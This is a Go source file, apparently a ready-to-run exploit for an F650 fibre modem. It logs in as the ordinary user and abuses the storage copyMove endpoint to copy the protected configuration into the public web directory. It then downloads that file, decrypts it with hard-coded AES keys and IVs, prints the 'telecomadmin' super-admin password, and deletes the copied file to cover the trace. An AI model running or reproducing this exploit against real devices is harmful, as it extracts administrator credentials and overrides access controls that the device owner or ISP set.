package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"

	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

var (
	Host          = "http://192.168.1.1"
	UrlLogin      = Host + "/cgi-bin/luci"
	UrlGetToken   = Host + "/cgi-bin/luci/"
	UrlGetDevInfo = Host + "/cgi-bin/luci/admin/settings/gwinfo?get=all"
	UrlExploit    = Host + "/cgi-bin/luci/admin/storage/copyMove"
	UrlDownCfg    = Host + ":8080/db_user_cfg.xml"
	UrlDeleteFile = Host + "/cgi-bin/luci/admin/storage/deleteFiles"
)

var (
	help         bool
	host         string
	username     string
	password     string
	downloadOnly bool
	cfgFile      string
)

type F650 struct {
	cookie  *http.Cookie
	token   string
	isLogin bool
	version Version
}

type Version struct {
	DevType    string `json:"DevType"`
	ProductCls string `json:"ProductCls"`
	SWVer      string `json:"SWVer"`
}

type Bytes []byte

func init() {
	flag.BoolVar(&help, "help", false, "帮助")
	flag.StringVar(&host, "h", "192.168.1.1", "光猫登录ip，默认为192.168.1.1(不需要http://)")
	flag.StringVar(&username, "u", "useradmin", "光猫普通用户账号，默认为useradmin")
	flag.StringVar(&password, "p", "", "光猫的管理密码")
	flag.BoolVar(&downloadOnly, "d", false, "只下载db_user_cfg.xml到当前目录")
	flag.StringVar(&cfgFile, "f", "", "从本地文件中读取并尝试解密,解密后的文件将会保存到新的文件中")
}

func main() {
	flag.Parse()
	if help {
		flag.Usage()
		os.Exit(0)
	}

	if len(cfgFile) > 0 {
		data, err := os.ReadFile(cfgFile)
		if err != nil {
			panic(err)
		}
		decryptAndPrint(data)
		decryptAndSaveToFile(data)

		os.Exit(0)
	}

	if host != "" {
		Host = fmt.Sprintf("http://%s", host)
	}

	if len(password) == 0 {
		scanner := bufio.NewScanner(os.Stdin)
		fmt.Printf("用户名： %s\n", username)
		fmt.Printf("密  码： ")
		if scanner.Scan() {
			password = scanner.Text()
		}
	}

	f, err := login(username, password)
	if err != nil {
		panic(err)
	}

	f.PrintDevInfo()
	f.Exploit()

	cfgData := f.DownConfig()
	if downloadOnly {
		os.WriteFile("db_user_cfg.xml", cfgData, os.ModePerm)
		f.Clear()
		os.Exit(0)
	}

	decryptAndPrint(cfgData)
	f.Clear()
}

func login(username, psd string) (*F650, error) {
	f650 := &F650{}

	client := http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	values := url.Values{}
	values.Add("username", username)
	values.Add("psd", psd)
	resp, err := client.PostForm(UrlLogin, values)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode == http.StatusFound {
		f650.cookie = resp.Cookies()[0]
		f650.isLogin = true
	} else {
		return nil, errors.New("登录失败: 账号或密码错误！")
	}

	// 获取token
	req, err := http.NewRequest(http.MethodGet, UrlGetToken, nil)
	if err != nil {
		return nil, err
	}
	req.AddCookie(f650.cookie)
	resp, err = client.Do(req)
	if err != nil {
		return nil, err
	}
	tokenBody, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err == nil {
		str := string(tokenBody)
		index := strings.Index(string(tokenBody), "token")
		if index >= 0 {
			f650.token = str[index+8 : index+8+32]
		} else {
			return nil, errors.New("获取token失败！")
		}
	} else {
		return nil, err
	}

	// 获取版本
	req, _ = http.NewRequest(http.MethodGet, UrlGetDevInfo, nil)
	req.AddCookie(f650.cookie)
	resp, err = client.Do(req)
	if err == nil {
		verBody, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		version := Version{}
		if err == nil {
			json.Unmarshal(verBody, &version)
			f650.version = version
		}
	}

	fmt.Println("\n登录成功")
	return f650, nil
}

func (f *F650) Exploit() {
	values := url.Values{}
	values.Add("token", f.token)
	values.Add("opstr", "copy|//userconfig/cfg|/home/httpd/public|db_user_cfg.xml")
	values.Add("fileLists", "db_user_cfg.xml/")
	values.Add("_", "0.5610212606529983")
	// 部分设备只能使用post请求,因此这里两种请求都用一次
	// Get
	Url, _ := url.Parse(UrlExploit)
	Url.RawQuery = values.Encode()
	req, _ := http.NewRequest(http.MethodGet, Url.String(), nil)
	req.AddCookie(f.cookie)
	(&http.Client{}).Do(req)
	// Post
	req, _ = http.NewRequest(http.MethodPost, UrlExploit, strings.NewReader(values.Encode()))
	req.AddCookie(f.cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	(&http.Client{}).Do(req)
}

func (f *F650) DownConfig() []byte {
	req, _ := http.NewRequest(http.MethodGet, UrlDownCfg, nil)
	resp, err := (&http.Client{}).Do(req)
	if err != nil || resp.StatusCode != http.StatusOK {
		panic(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return body
}

func (f *F650) Clear() {
	values := url.Values{}
	values.Add("token", f.token)
	values.Add("path", "//home/httpd/public")
	values.Add("fileLists", "db_user_cfg.xml/")
	values.Add("_", "0.5610212606529983")
	req, _ := http.NewRequest(http.MethodPost, UrlDeleteFile, strings.NewReader(values.Encode()))
	req.AddCookie(f.cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	(&http.Client{}).Do(req)
	if len(os.Args) == 1 {
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
	}
}

func (f *F650) PrintDevInfo() {
	fmt.Println("-----------------------------------------")
	fmt.Printf("设备类型：%s\n设备型号：%s\n固件版本：%s\n",
		f.version.DevType, f.version.ProductCls, f.version.SWVer)
	fmt.Println("-----------------------------------------")
}

func decryptAndPrint(data []byte) {
	{
		fmt.Println("CRC")
		origin, _ := CRC(data)
		user, spwd, _ := readPass(origin)
		fmt.Printf("\t超管账号： %s\n", user)
		fmt.Printf("\t超管密码： %s\n", spwd)
	}

	{
		fmt.Println("AESCBC")
		origin, _ := AESCBC(data)
		user, spwd, _ := readPass(origin)
		fmt.Printf("\t超管账号： %s\n", user)
		fmt.Printf("\t超管密码： %s\n", spwd)
	}

}

func decryptAndSaveToFile(data []byte) {
	{
		origin, err := CRC(data)
		if err == nil {
			os.WriteFile("db_user_cfg_crc.xml", origin, os.ModePerm)
		}
	}

	{
		origin, err := AESCBC(data)
		if err == nil {
			os.WriteFile("db_user_cfg_aescbc.xml", origin, os.ModePerm)
		}
	}
}

func readPass(data []byte) (username, pwd string, err error) {
	index := bytes.Index(data, []byte("telecomadmin"))
	if index < 0 {
		return "", "", errors.New("似乎不支持你的光猫")
	}
	index = bytes.Index(data[index:], []byte("val=\"")) + index + len("val=\"")
	end := bytes.Index(data[index:], []byte("\"")) + index
	return "telecomadmin", string(data[index:end]), nil
}

func CRC(data []byte) (dData []byte, err error) {
	defer func() {
		if er := recover(); er != nil {
			fmt.Println(er)
			dData, err = nil, errors.New("CRC：无法解密")
		}
	}()
	var nextOff, blockSize uint32 = 60, 0
	var out bytes.Buffer
	for nextOff != 0 {
		blockSize = unpackI(data[nextOff+4 : nextOff+8])
		blockData := data[nextOff+12 : nextOff+12+blockSize]
		r, err := zlib.NewReader(bytes.NewBuffer(blockData))
		if err != nil {
			return nil, err
		}
		io.Copy(&out, r)
		nextOff = unpackI(data[nextOff+8 : nextOff+12])
	}

	return out.Bytes(), nil
}

func AESCBC(data []byte) (dData []byte, err error) {
	defer func() {
		if er := recover(); er != nil {
			fmt.Println(er)
			dData, err = nil, errors.New("AESCBC：无法解密")
		}
	}()
	sign := unpackI(data[4:8])
	key := []byte("8cc72b05705d5c46f412af8cbed55aad")[:31]
	iv := []byte("667b02a85c61c786def4521b060265e8")[:31]
	if sign != 4 {
		key, iv = []byte("PON_Dkey"), []byte("PON_DIV")
	}
	keyArr, ivArr := sha256.Sum256(key), sha256.Sum256(iv)
	key, iv = keyArr[:], ivArr[:16]
	block, _ := aes.NewCipher(key)
	mode := cipher.NewCBCDecrypter(block, iv)

	var nextOff, blockSize uint32 = 60, 0
	var out bytes.Buffer
	for nextOff != 0 {
		blockSize = unpackI(data[nextOff+4 : nextOff+8])
		blockData := make([]byte, blockSize)
		copy(blockData, data[nextOff+12:nextOff+12+blockSize])
		mode.CryptBlocks(blockData, blockData)
		out.Write(blockData)
		nextOff = unpackI(data[nextOff+8 : nextOff+12])
	}

	return CRC(out.Bytes())
}

func unpackI(data []byte) uint32 {
	var res uint32
	buffer := bytes.NewBuffer(data)
	binary.Read(buffer, binary.BigEndian, &res)
	return res
}
